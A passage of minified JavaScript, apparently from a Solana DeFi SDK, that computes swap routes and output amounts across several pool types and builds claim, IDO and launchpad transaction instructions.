                { feeConfig: k }
              )
            );
          } catch (_) {
            this.logDebug(
              "direct error",
              B.version,
              B.id.toString(),
              _.message
            );
          }
        this.logDebug("direct done");
        for (let [B, C] of Object.entries(r)) {
          let t = {
              chainId: 101,
              address: B,
              programId: C.mintProgram.toBase58(),
              logoURI: "",
              symbol: "",
              name: "",
              decimals: C.mDecimals,
              tags: [],
              extensions: {},
            },
            e = C.in
              .map((e) => {
                try {
                  return {
                    pool: e,
                    data: this.computeAmountOut({
                      itemPool: e,
                      tickCache: i,
                      simulateCache: o,
                      chainTime: a,
                      epochInfo: u,
                      slippage: s,
                      outputToken: t,
                      amountIn: A,
                    }),
                  };
                } catch (n) {
                  return (
                    this.logDebug(
                      "route in error",
                      e.version,
                      e.id.toString(),
                      n.message
                    ),
                    void 0
                  );
                }
              })
              .sort((t, e) => {
                var n, r, o, i;
                let s =
                    void 0 === t
                      ? Dx
                      : t.data.amountOut.amount.raw.sub(
                          null !=
                            (r =
                              null == (n = t.data.amountOut.fee)
                                ? void 0
                                : n.raw)
                            ? r
                            : Dx
                        ),
                  a =
                    void 0 === e
                      ? Dx
                      : e.data.amountOut.amount.raw.sub(
                          null !=
                            (i =
                              null == (o = e.data.amountOut.fee)
                                ? void 0
                                : o.raw)
                            ? i
                            : Dx
                        );
                return s.lt(a) ? 1 : -1;
              })[0];
          if (void 0 === e) continue;
          let n = new OI(
            lE(t),
            e.data.amountOut.amount.raw.sub(
              null != (d = null == (l = e.data.amountOut.fee) ? void 0 : l.raw)
                ? d
                : Dx
            )
          );
          for (let r of C.out)
            try {
              let t = this.computeAmountOut({
                itemPool: r,
                tickCache: i,
                simulateCache: o,
                chainTime: a,
                epochInfo: u,
                slippage: s,
                outputToken: I,
                amountIn: n,
              });
              S.push(
                _A(SA({}, t), {
                  allTrade: !(!e.data.allTrade || !t.allTrade),
                  amountIn: e.data.amountIn,
                  amountOut: t.amountOut,
                  minAmountOut: t.minAmountOut,
                  currentPrice: void 0,
                  executionPrice: new bI(
                    new tS({
                      baseToken: e.data.amountIn.amount.token,
                      denominator: e.data.amountIn.amount.raw,
                      quoteToken: t.amountOut.amount.token,
                      numerator: t.amountOut.amount.raw.sub(
                        null !=
                          (h = null == (f = t.amountOut.fee) ? void 0 : f.raw)
                          ? h
                          : Dx
                      ),
                    }).toFixed()
                  ),
                  priceImpact: new bI(
                    e.data.priceImpact.add(t.priceImpact).toFixed()
                  ),
                  fee: [e.data.fee[0], t.fee[0]],
                  routeType: "route",
                  poolInfoList: [e.pool, r],
                  remainingAccounts: [
                    e.data.remainingAccounts[0],
                    t.remainingAccounts[0],
                  ],
                  minMiddleAmountFee:
                    null != (p = t.amountOut.fee) && p.raw
                      ? new OI(
                          e.data.amountOut.amount.token,
                          (null !=
                          (g =
                            null == (m = e.data.amountOut.fee) ? void 0 : m.raw)
                            ? g
                            : Dx
                          ).add(
                            null !=
                              (w =
                                null == (y = t.amountOut.fee) ? void 0 : y.raw)
                              ? w
                              : Dx
                          )
                        )
                      : void 0,
                  middleToken: e.data.amountOut.amount.token,
                  poolReady: e.data.poolReady && t.poolReady,
                  poolType: [e.data.poolType, t.poolType],
                  feeConfig: k,
                  expirationTime: W_(e.data.expirationTime, t.expirationTime),
                })
              );
            } catch (T) {
              this.logDebug(
                "route out error",
                r.version,
                r.id.toString(),
                T.message
              );
            }
        }
        return S.filter(
          (t) => (
            t.allTrade ||
              this.logDebug(
                `pool ${t.poolInfoList
                  .map((t) => t.id.toString())
                  .join(",")} filter out since not all trade`
              ),
            t.allTrade
          )
        ).sort((t, e) =>
          t.amountOut.amount.raw.sub(e.amountOut.amount.raw).gt(Dx) ? -1 : 1
        );
      }
      computeAmountOut({
        itemPool: t,
        tickCache: e,
        simulateCache: n,
        chainTime: r,
        epochInfo: o,
        slippage: i,
        outputToken: s,
        amountIn: a,
      }) {
        if (6 === t.version) {
          let {
            allTrade: n,
            realAmountIn: u,
            amountOut: c,
            minAmountOut: l,
            expirationTime: d,
            currentPrice: f,
            executionPrice: h,
            priceImpact: p,
            fee: m,
            remainingAccounts: g,
            executionPriceX64: y,
          } = NC.computeAmountOutFormat({
            poolInfo: t,
            tickArrayCache: e[t.id.toString()],
            amountIn: a.raw,
            tokenOut: s,
            slippage: i,
            epochInfo: o,
            catchLiquidityInsufficient: !0,
          });
          return {
            allTrade: n,
            amountIn: u,
            amountOut: c,
            minAmountOut: l,
            currentPrice: new bI(f.toFixed()),
            executionPrice: new bI(h.toFixed()),
            priceImpact: new bI(p.toFixed()),
            fee: [m],
            remainingAccounts: [g],
            routeType: "amm",
            poolInfoList: [t],
            poolReady: t.startTime < r,
            poolType: "CLMM",
            slippage: i,
            clmmExPriceX64: [y],
            expirationTime: W_(u.expirationTime, d),
          };
        }
        if (7 === t.version) {
          let {
            allTrade: e,
            executionPrice: n,
            amountOut: o,
            minAmountOut: u,
            priceImpact: c,
            fee: l,
          } = this.scope.cpmm.computeSwapAmount({
            pool: t,
            outputMint: s.address,
            amountIn: a.raw,
            slippage: i,
          });
          return {
            allTrade: e,
            amountIn: { amount: a, fee: void 0, expirationTime: void 0 },
            amountOut: {
              amount: dE(_A(SA({}, s), { amount: o })),
              fee: void 0,
              expirationTime: void 0,
            },
            minAmountOut: {
              amount: dE(_A(SA({}, s), { amount: u })),
              fee: void 0,
              expirationTime: void 0,
            },
            currentPrice: t.poolPrice,
            executionPrice: n,
            priceImpact: c,
            fee: [new OI(a.token, l)],
            remainingAccounts: [],
            routeType: "amm",
            poolInfoList: [t],
            poolReady: t.openTime.toNumber() < r,
            poolType: "CPMM",
            slippage: i,
            clmmExPriceX64: [void 0],
            expirationTime: void 0,
          };
        }
        {
          if (![1, 6, 7].includes(n[t.id.toString()].status))
            throw Error("swap error");
          let {
            amountOut: e,
            minAmountOut: o,
            currentPrice: u,
            executionPrice: c,
            priceImpact: l,
            fee: d,
          } = this.scope.liquidity.computeAmountOut({
            poolInfo: n[t.id.toString()],
            amountIn: a.raw,
            mintIn: a.token.mint,
            mintOut: s.address,
            slippage: i,
          });
          return {
            amountIn: { amount: a, fee: void 0, expirationTime: void 0 },
            amountOut: {
              amount: dE(_A(SA({}, s), { amount: e })),
              fee: void 0,
              expirationTime: void 0,
            },
            minAmountOut: {
              amount: dE(_A(SA({}, s), { amount: o })),
              fee: void 0,
              expirationTime: void 0,
            },
            currentPrice: u,
            executionPrice: c,
            priceImpact: l,
            fee: [new OI(a.token, d)],
            routeType: "amm",
            poolInfoList: [t],
            remainingAccounts: [],
            poolReady: Number(n[t.id].openTime) < r,
            poolType: 5 === t.version ? "STABLE" : void 0,
            expirationTime: void 0,
            allTrade: !0,
            slippage: i,
            clmmExPriceX64: [void 0],
          };
        }
      }
      async computePoolToPoolKeys({
        pools: t,
        clmmRpcData: e = {},
        ammRpcData: n = {},
      }) {
        let r = new Set(
          t
            .filter((t) => 6 === t.version && !e[t.id.toString()])
            .map((t) => t.id.toString())
        );
        if (r.size > 0) {
          let t = await this.scope.clmm.getRpcClmmPoolInfos({
            poolIds: Array.from(r),
          });
          Object.keys(t).forEach((n) => {
            e[n] = t[n];
          });
        }
        let o = new Set(
          t
            .filter((t) => 4 === t.version && !n[t.id.toString()])
            .map((t) => t.id.toString())
        );
        if (o.size > 0) {
          let t = await this.scope.liquidity.getRpcPoolInfos(Array.from(o));
          Object.keys(t).forEach((e) => {
            n[e] = t[e];
          });
        }
        let i = new Set(
            t.filter((t) => 4 === t.version).map((t) => t.marketId)
          ),
          s = {};
        i.size > 0 &&
          (
            await MA(
              this.scope.connection,
              Array.from(i).map((t) => ({ pubkey: new Ji(t) }))
            )
          ).forEach((t) => {
            if (!t.accountInfo) return;
            let e = Px.decode(t.accountInfo.data);
            s[t.pubkey.toBase58()] = {
              marketId: t.pubkey.toString(),
              marketProgramId: t.accountInfo.owner.toString(),
              marketAuthority: Mx.getAssociatedAuthority({
                programId: t.accountInfo.owner,
                marketId: t.pubkey,
              }).publicKey.toString(),
              marketBaseVault: e.baseVault.toString(),
              marketQuoteVault: e.quoteVault.toString(),
              marketBids: e.bids.toString(),
              marketAsks: e.asks.toString(),
              marketEventQueue: e.eventQueue.toString(),
            };
          });
        let a = [];
        return (
          t.forEach((t) => {
            if (6 === t.version) {
              let n = e[t.id.toString()],
                r = {
                  programId: t.programId.toBase58(),
                  id: t.id.toBase58(),
                  mintA: t.mintA,
                  mintB: t.mintB,
                  openTime: String(t.startTime),
                  vault: { A: n.vaultA.toBase58(), B: n.vaultB.toBase58() },
                  config: _A(SA({}, t.ammConfig), {
                    id: t.ammConfig.id.toString(),
                    defaultRange: 0,
                    defaultRangePoint: [],
                  }),
                  rewardInfos: [],
                  observationId: t.observationId.toBase58(),
                  exBitmapAccount: t.exBitmapAccount.toBase58(),
                };
              a.push(r);
            } else if (4 === t.version) {
              let e = n[t.id.toString()],
                r = SA(
                  {
                    programId: t.programId,
                    id: t.id,
                    mintA: t.mintA,
                    mintB: t.mintB,
                    openTime: String(t.openTime),
                    vault: {
                      A: e.baseVault.toBase58(),
                      B: e.quoteVault.toBase58(),
                    },
                    authority: jE({
                      programId: new Ji(t.programId),
                    }).publicKey.toString(),
                    openOrders: e.openOrders.toBase58(),
                    targetOrders: e.targetOrders.toBase58(),
                    mintLp: t.lpMint,
                  },
                  s[t.marketId]
                );
              a.push(r);
            } else
              7 === t.version &&
                a.push({
                  observationId: t.observationId.toBase58(),
                  programId: t.programId.toBase58(),
                  id: t.id.toBase58(),
                  mintA: t.mintA,
                  mintB: t.mintB,
                  openTime: String(t.openTime),
                  authority: lx(t.programId).publicKey.toBase58(),
                  vault: { A: t.vaultA.toBase58(), B: t.vaultB.toBase58() },
                  mintLp: fE({
                    address: t.mintLp.toBase58(),
                    programId: Bc.toBase58(),
                    decimals: t.lpDecimals,
                  }),
                  config: _A(SA({ id: t.configId.toBase58() }, t.configInfo), {
                    protocolFeeRate: t.configInfo.protocolFeeRate.toNumber(),
                    tradeFeeRate: t.configInfo.tradeFeeRate.toNumber(),
                    fundFeeRate: t.configInfo.fundFeeRate.toNumber(),
                    createPoolFee: t.configInfo.createPoolFee.toString(),
                  }),
                });
          }),
          a
        );
      }
    },
    qx = class extends cT {
      static getPdaPoolId(t, e) {
        return f_([qx.SEED_CONFIG.pool.id, e.toBuffer()], t);
      }
      static getPdaOwnerId(t, e, n, r) {
        return f_(
          [
            qx.SEED_CONFIG.owner.id,
            e.toBuffer(),
            n.toBuffer(),
            dt.from(new Yn(r).toArray()),
          ],
          t
        );
      }
      static async getAllInfo({
        connection: t,
        programId: e,
        poolIds: n,
        wallet: r,
        chainTime: o,
      }) {
        if (0 === n.length) return [];
        let i = n.map((t) => qx.getPdaPoolId(e, t).publicKey),
          s = [];
        for (let c = 0; c < qx.VERSION_PROJECT.length; c++)
          s.push(...i.map((t) => qx.getPdaOwnerId(e, t, r, c).publicKey));
        let a = await RA(t, [...i, ...s]),
          u = [];
        for (let c = 0; c < a.length; c++) {
          let t = Math.floor(c / n.length),
            r = c % n.length,
            l = i[r],
            d = s[c],
            f = a[r],
            h = a[n.length + c];
          if (
            !f ||
            !h ||
            f.data.length !== qx.POOL_LAYOUT.span ||
            h.data.length !== qx.OWNER_LAYOUT.span
          )
            continue;
          let p = qx.POOL_LAYOUT.decode(f.data),
            m = qx.OWNER_LAYOUT.decode(h.data),
            g = p.openTime.toNumber(),
            y = p.endTime.toNumber(),
            w =
              3 !==
              m.tokenInfo
                .map((t) => t.debtAmount.gt(new Yn(0)))
                .filter((t) => !t).length,
            b = o > g && o < y && 1 === p.status,
            v = w && b;
          u.push({
            programId: e,
            poolId: l,
            ammId: p.ammId,
            ownerAccountId: d,
            snapshotLpAmount: m.lpAmount,
            project: qx.VERSION_PROJECT[t],
            openTime: g,
            endTime: y,
            canClaim: v,
            canClaimErrorType: w
              ? b
                ? void 0
                : "outOfOperationalTime"
              : "alreadyClaimIt",
            tokenInfo: p.tokenInfo.map((t, e) => ({
              mintAddress: t.mintAddress,
              mintVault: t.mintVault,
              mintDecimals: t.mintDecimals,
              perLpLoss: t.perLpLoss,
              debtAmount: m.tokenInfo[e].debtAmount.add(
                m.tokenInfo[e].claimedAmount
              ),
            })),
          });
        }
        return u;
      }
      async makeClaimTransaction({ poolInfo: t, ownerInfo: e, feePayer: n }) {
        e.wallet || this.scope.checkOwner();
        let r = this.createTxBuilder(n),
          o = e.wallet || this.scope.ownerPubKey,
          i = [];
        for (let u of t.tokenInfo) {
          let { account: t, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: u.mintAddress,
              owner: this.scope.ownerPubKey,
              notUseTokenAccount: u.mintAddress.equals(XI.WSOL.mint),
              createInfo: { payer: o, amount: 0 },
              skipCloseAccount: !u.mintAddress.equals(XI.WSOL.mint),
              associatedOnly:
                !u.mintAddress.equals(XI.WSOL.mint) && e.associatedOnly,
            });
          n && r.addInstruction(n), i.push(t);
        }
        r.addInstruction({
          instructions: [
            qx.makeClaimInstruction({
              programId: t.programId,
              poolInfo: t,
              ownerInfo: {
                wallet: o,
                ownerPda: t.ownerAccountId,
                claimAddress: i,
              },
            }),
          ],
        });
        let { transaction: s, signers: a } = r.build();
        return [{ transaction: s, signer: a }];
      }
      async makeClaimAllTransaction({
        poolInfos: t,
        ownerInfo: e,
        feePayer: n,
      }) {
        let r = this.createTxBuilder(n),
          o = e.wallet || this.scope.ownerPubKey,
          i = {};
        for (let c of t) {
          let t = [];
          for (let n of c.tokenInfo) {
            let { account: s, instructionParams: a } =
              await this.scope.account.getOrCreateTokenAccount({
                mint: n.mintAddress,
                owner: this.scope.ownerPubKey,
                notUseTokenAccount: n.mintAddress.equals(XI.WSOL.mint),
                createInfo: { payer: o, amount: 0 },
                skipCloseAccount: !n.mintAddress.equals(XI.WSOL.mint),
                associatedOnly:
                  !n.mintAddress.equals(XI.WSOL.mint) && e.associatedOnly,
              });
            a && r.addInstruction(a),
              s && ((i[n.mintAddress.toString()] = s), t.push(s));
          }
          r.addInstruction({
            instructions: [
              qx.makeClaimInstruction({
                programId: c.programId,
                poolInfo: c,
                ownerInfo: {
                  wallet: o,
                  ownerPda: c.ownerAccountId,
                  claimAddress: t,
                },
              }),
            ],
          });
        }
        let { transaction: s, signers: a } = r.build(),
          u = r.allInstructions;
        return d_(u, [o, ...a.map((t) => t.publicKey)])
          ? [{ transaction: s, signer: a }]
          : [
              {
                transaction: new As().add(
                  ...u.slice(0, r.AllTxData.instructions.length - 1)
                ),
                signer: a,
              },
              {
                transaction: new As().add(
                  ...u.slice(r.AllTxData.instructions.length - 1)
                ),
                signer: [],
              },
              {
                transaction: new As().add(...r.AllTxData.endInstructions),
                signer: [],
              },
            ];
      }
      static makeClaimInstruction({ programId: t, poolInfo: e, ownerInfo: n }) {
        let r = JT([]),
          o = [
            { pubkey: n.wallet, isSigner: !0, isWritable: !0 },
            { pubkey: e.poolId, isSigner: !1, isWritable: !0 },
            { pubkey: n.ownerPda, isSigner: !1, isWritable: !0 },
            ...n.claimAddress.map((t) => ({
              pubkey: t,
              isSigner: !1,
              isWritable: !0,
            })),
            ...e.tokenInfo.map(({ mintVault: t }) => ({
              pubkey: t,
              isSigner: !1,
              isWritable: !0,
            })),
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
          ],
          i = dt.alloc(r.span);
        r.encode({}, i);
        let s = dt.from([10, 66, 208, 184, 161, 6, 191, 98, ...i]);
        return new vs({ keys: o, programId: t, data: s });
      }
    },
    zx = qx;
  (zx.CLAIMED_NUM = 3),
    (zx.POOL_LAYOUT = JT([
      RT(8),
      UT("bump"),
      UT("status"),
      zT("openTime"),
      zT("endTime"),
      jT("ammId"),
      YT(
        JT([
          UT("mintDecimals"),
          jT("mintAddress"),
          jT("mintVault"),
          zT("perLpLoss"),
          zT("totalClaimedAmount"),
        ]),
        qx.CLAIMED_NUM,
        "tokenInfo"
      ),
      YT(zT(), 10, "padding"),
    ])),
    (zx.OWNER_LAYOUT = JT([
      RT(8),
      UT("bump"),
      UT("version"),
      jT("poolId"),
      jT("owner"),
      zT("lpAmount"),
      YT(
        JT([jT("mintAddress"), zT("debtAmount"), zT("claimedAmount")]),
        qx.CLAIMED_NUM,
        "tokenInfo"
      ),
      YT(zT(), 4, "padding"),
    ])),
    (zx.DEFAULT_POOL_ID = [
      "58oQChx4yWmvKdwLLZzBi4ChoCc2fqCUWBkwMihLYQo2",
      "6UmmUiYoBjSrhakAobJw8BvkmJtDVxaeBtbt7rxWo1mg",
      "AVs9TA4nWDzfPJE9gGVNJMVhcQy3V9PGazuz33BfG2RA",
      "DVa7Qmb5ct9RCpaU7UTpSaf3GVMYz17vNVU67XpdCRut",
      "7XawhbbxtsRcQA8KTkHT9f9nc6d69UwqCDh6U5EEbEmX",
      "6a1CsrpeZubDjEJE9s1CMVheB6HWM5d7m1cj2jkhyXhj",
      "EoNrn8iUhwgJySD1pHu8Qxm5gSQqLK3za4m8xzD2RuEb",
      "AceAyRTWt4PyB2pHqf2qhDgNZDtKVNaxgL8Ru3V4aN1P",
      "6tmFJbMk5yVHFcFy7X2K8RwHjKLr6KVFLYXpgpBNeAxB",
    ].map((t) => new Ji(t))),
    (zx.SEED_CONFIG = {
      pool: { id: dt.from("pool_seed", "utf8") },
      owner: { id: dt.from("user_claim_seed", "utf8") },
    }),
    (zx.VERSION_PROJECT = [void 0, "Francium", "Tulip", "Larix"]),
    JT([UT("instruction"), xT("amount")]);
  var Kx = JT([UT("instruction")]);
  function Wx({ programId: t }, e) {
    let n = [
        { pubkey: Bc, isSigner: !1, isWritable: !1 },
        { pubkey: WI, isSigner: !1, isWritable: !1 },
        ...Object.entries(e).map(([t, e]) => ({
          pubkey: e,
          isSigner: "userOwner" === t,
          isWritable: !["authority", "userOwner"].includes(t),
        })),
      ],
      r = dt.alloc(Kx.span);
    return (
      Kx.encode({ instruction: 2 }, r),
      new vs({ keys: n, programId: t, data: r })
    );
  }
  function Fx(t) {
    let { poolConfig: e, userKeys: n, side: r } = t,
      o = "base" === r ? n.baseTokenAccount : n.quoteTokenAccount,
      i = "base" === r ? e.baseVault : e.quoteVault,
      s = dt.alloc(Kx.span);
    Kx.encode({ instruction: 2 }, s);
    let a = [
      { pubkey: Bc, isWritable: !1, isSigner: !1 },
      { pubkey: Ss, isWritable: !1, isSigner: !1 },
      { pubkey: e.id, isWritable: !0, isSigner: !1 },
      { pubkey: e.authority, isWritable: !1, isSigner: !1 },
      { pubkey: i, isWritable: !0, isSigner: !1 },
      { pubkey: o, isWritable: !0, isSigner: !1 },
      { pubkey: n.ledgerAccount, isWritable: !0, isSigner: !1 },
      { pubkey: n.owner, isWritable: !1, isSigner: !0 },
    ];
    return new vs({ programId: e.programId, keys: a, data: s });
  }
  var jx = {
      [q_.IDO_PROGRAM_ID_V1.toString()]: 1,
      [q_.IDO_PROGRAM_ID_V2.toString()]: 2,
      [q_.IDO_PROGRAM_ID_V3.toString()]: 3,
      [q_.IDO_PROGRAM_ID_V4.toString()]: 4,
    },
    Gx = class extends cT {
      async claim({
        ownerInfo: t,
        idoKeys: e,
        associatedOnly: n = !0,
        checkCreateATAOwner: r = !1,
        txVersion: o,
        feePayer: i,
      }) {
        let s = this.createTxBuilder(i),
          a = jx[e.programId];
        a || this.logAndCreateError("invalid version", a);
        let u = eS(e),
          [c, l] = [!new Yn(t.coin).isZero(), !new Yn(t.pc).isZero()],
          d = u.projectInfo.mint.address.equals(GI),
          { account: f, instructionParams: h } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: u.projectInfo.mint.programId,
              mint: u.projectInfo.mint.address,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !d,
              notUseTokenAccount: d,
              associatedOnly: !d && n,
              checkCreateATAOwner: r,
            });
        !f &&
          c &&
          this.logAndCreateError(
            "target token accounts not found",
            "mint",
            e.projectInfo.mint.address
          ),
          c && h && s.addInstruction(h);
        let p = u.buyInfo.mint.address.equals(GI),
          { account: m, instructionParams: g } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: u.buyInfo.mint.programId,
              mint: u.buyInfo.mint.address,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !p,
              notUseTokenAccount: p,
              associatedOnly: !p && n,
              checkCreateATAOwner: r,
            });
        if (
          (!f &&
            l &&
            this.logAndCreateError(
              "target token accounts not found",
              "mint",
              e.projectInfo.mint.address
            ),
          l && g && s.addInstruction(g),
          (!f || !m) &&
            this.logAndCreateError(
              "target token accounts not found",
              "mint",
              e.projectInfo.mint.address,
              e.buyInfo.mint.address
            ),
          3 === a)
        )
          return s
            .addInstruction({
              instructions: [
                ...(c
                  ? [
                      Wx(
                        { programId: u.programId },
                        {
                          idoId: u.id,
                          authority: u.authority,
                          poolTokenAccount: u.projectInfo.vault,
                          userTokenAccount: f,
                          userIdoInfo: new Ji(t.userIdoInfo),
                          userOwner: this.scope.ownerPubKey,
                        }
                      ),
                    ]
                  : []),
                ...(l
                  ? [
                      Wx(
                        { programId: new Ji(e.programId) },
                        {
                          idoId: u.id,
                          authority: u.authority,
                          poolTokenAccount: u.buyInfo.vault,
                          userTokenAccount: m,
                          userIdoInfo: new Ji(t.userIdoInfo),
                          userOwner: this.scope.ownerPubKey,
                        }
                      ),
                    ]
                  : []),
              ],
            })
            .versionBuild({ txVersion: o });
        if (a < 3)
          return (
            !c && !l && this.logAndCreateError("no claimable rewards"),
            s
              .addInstruction({
                instructions: [
                  Wx(
                    { programId: u.programId },
                    {
                      idoId: u.id,
                      authority: u.authority,
                      poolQuoteTokenAccount: u.buyInfo.vault,
                      poolBaseTokenAccount: u.projectInfo.vault,
                      userQuoteTokenAccount: m,
                      userBaseTokenAccount: f,
                      userIdoInfo: new Ji(t.userIdoInfo),
                      userOwner: this.scope.ownerPubKey,
                    }
                  ),
                ],
              })
              .versionBuild({ txVersion: o })
          );
        let y = {
          poolConfig: {
            id: u.id,
            programId: u.programId,
            authority: u.authority,
            baseVault: u.projectInfo.vault,
            quoteVault: u.buyInfo.vault,
            baseToken: e.projectInfo.mint,
            quoteToken: e.buyInfo.mint,
          },
          userKeys: {
            baseTokenAccount: f,
            quoteTokenAccount: m,
            ledgerAccount: new Ji(t.userIdoInfo),
            owner: this.scope.ownerPubKey,
          },
        };
        return s
          .addInstruction({
            instructions: [
              ...(c ? [Fx(_A(SA({}, y), { side: "base" }))] : []),
              ...(l ? [Fx(_A(SA({}, y), { side: "quote" }))] : []),
            ],
          })
          .versionBuild({ txVersion: o });
      }
    },
    Vx = dt.from("vault_auth_seed", "utf8"),
    Hx = dt.from("global_config", "utf8"),
    Zx = dt.from("pool", "utf8"),
    Xx = dt.from("pool_vault", "utf8"),
    Jx = dt.from("pool_vesting", "utf8"),
    Yx = dt.from("platform_config", "utf8");
  function Qx(t) {
    return f_([Vx], t);
  }
  function $x(t, e, n) {
    return f_([Zx, e.toBuffer(), n.toBuffer()], t);
  }
  function tP(t, e, n) {
    return f_([Xx, e.toBuffer(), n.toBuffer()], t);
  }
  function eP(t) {
    let e = new ArrayBuffer(1);
    return new DataView(e).setUint8(0, t), new Uint8Array(e);
  }
  function nP(t) {
    return f_([dt.from("__event_authority", "utf8")], t);
  }
  function rP(t, e) {
    return f_([Yx, e.toBuffer()], t);
  }
  function oP(t, e, n) {
    return f_([Jx, e.toBuffer(), n.toBuffer()], t);
  }
  var iP = {
    initialize: dt.from([175, 175, 109, 31, 13, 152, 155, 237]),
    buyExactIn: dt.from([250, 234, 13, 123, 213, 156, 19, 236]),
    buyExactOut: dt.from([24, 211, 116, 40, 105, 3, 153, 56]),
    sellExactIn: dt.from([149, 39, 222, 155, 211, 124, 152, 26]),
    sellExactOut: dt.from([95, 200, 71, 34, 8, 9, 11, 166]),
    createVestingAccount: dt.from([129, 178, 2, 13, 217, 172, 230, 218]),
    claimVestedToken: dt.from([49, 33, 104, 30, 189, 157, 79, 35]),
    createPlatformConfig: dt.from([176, 90, 196, 175, 253, 113, 220, 20]),
    claimPlatformFee: dt.from([156, 39, 208, 135, 76, 237, 61, 72]),
    updatePlaformConfig: dt.from([195, 60, 76, 129, 146, 45, 67, 143]),
  };
  function sP(
    t,
    e,
    n,
    r,
    o,
    i,
    s,
    a,
    u,
    c,
    l,
    d,
    f,
    h,
    p,
    m,
    g,
    y,
    w,
    b,
    v,
    A
  ) {
    let k = JT([UT("decimals"), ZT("name"), ZT("symbol"), ZT("uri")]),
      I = JT([zT("totalLockedAmount"), zT("cliffPeriod"), zT("unlockPeriod")]),
      S = JT([
        UT("index"),
        zT("supply"),
        zT("totalFundRaisingB"),
        UT("migrateType"),
      ]),
      _ = JT([
        UT("index"),
        zT("supply"),
        zT("totalSellA"),
        zT("totalFundRaisingB"),
        UT("migrateType"),
      ]),
      T = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !1 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !0, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !1 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: FI, isSigner: !1, isWritable: !1 },
        { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
        { pubkey: KI, isSigner: !1, isWritable: !1 },
        { pubkey: nP(t).publicKey, isSigner: !1, isWritable: !1 },
        { pubkey: t, isSigner: !1, isWritable: !1 },
      ],
      B = dt.alloc(
        dt.from(m, "utf-8").length +
          dt.from(g, "utf-8").length +
          dt.from(y, "utf-8").length +
          12 +
          1
      ),
      C = dt.alloc(I.span),
      E = dt.alloc("ConstantCurve" === w.type ? _.span : S.span);
    return (
      k.encode({ decimals: p, name: m, symbol: g, uri: y }, B),
      "ConstantCurve" === w.type
        ? _.encode(
            _A(SA({ index: 0 }, w), {
              migrateType: "amm" === w.migrateType ? 0 : 1,
            }),
            E
          )
        : "FixedCurve" === w.type
        ? S.encode(
            _A(SA({ index: 1 }, w), {
              migrateType: "amm" === w.migrateType ? 0 : 1,
            }),
            E
          )
        : "LinearCurve" === w.type &&
          S.encode(
            _A(SA({ index: 2 }, w), {
              migrateType: "amm" === w.migrateType ? 0 : 1,
            }),
            E
          ),
      I.encode({ totalLockedAmount: b, cliffPeriod: v, unlockPeriod: A }, C),
      new vs({
        keys: T,
        programId: t,
        data: dt.from([...iP.initialize, ...B, ...E, ...C]),
      })
    );
  }
  function aP(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y) {
    let w = JT([zT("amountB"), zT("minAmountA"), zT("shareFeeRate")]),
      b = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: nP(t).publicKey, isSigner: !1, isWritable: !1 },
        { pubkey: t, isSigner: !1, isWritable: !1 },
      ];
    y && b.push({ pubkey: y, isSigner: !1, isWritable: !0 }), void 0;
    let v = dt.alloc(w.span);
    return (
      w.encode(
        { amountB: p, minAmountA: m, shareFeeRate: null != g ? g : new Yn(0) },
        v
      ),
      new vs({ keys: b, programId: t, data: dt.from([...iP.buyExactIn, ...v]) })
    );
  }
  function uP(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y) {
    let w = JT([zT("amountA"), zT("minAmountB"), zT("shareFeeRate")]),
      b = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: nP(t).publicKey, isSigner: !1, isWritable: !1 },
        { pubkey: t, isSigner: !1, isWritable: !1 },
      ];
    y && b.push({ pubkey: y, isSigner: !1, isWritable: !0 });
    let v = dt.alloc(w.span);
    return (
      w.encode(
        { amountA: p, minAmountB: m, shareFeeRate: null != g ? g : new Yn(0) },
        v
      ),
      new vs({
        keys: b,
        programId: t,
        data: dt.from([...iP.sellExactIn, ...v]),
      })
    );
  }
  function cP(t, e, n, r, o, i, s, a, u) {
    let c = JT([]),
      l = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
